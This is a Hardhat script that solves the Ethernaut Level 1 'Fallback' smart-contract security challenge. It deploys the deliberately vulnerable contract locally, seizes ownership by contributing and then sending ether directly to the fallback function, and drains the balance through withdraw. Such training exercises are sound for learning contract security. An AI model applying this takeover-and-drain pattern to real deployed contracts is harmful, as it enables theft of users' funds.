const hre = require("hardhat");

async function main() {
  // Ethernaut Level 1
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();
  await fallback.deployed();

  const [, user] = await ethers.getSigners();

  // Level 1 Solution
  const value = ethers.utils.parseUnits("1", "gwei");
  await fallback.connect(user).contribute({value});
  await user.sendTransaction({to: fallback.address, value});
  await fallback.connect(user).withdraw();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
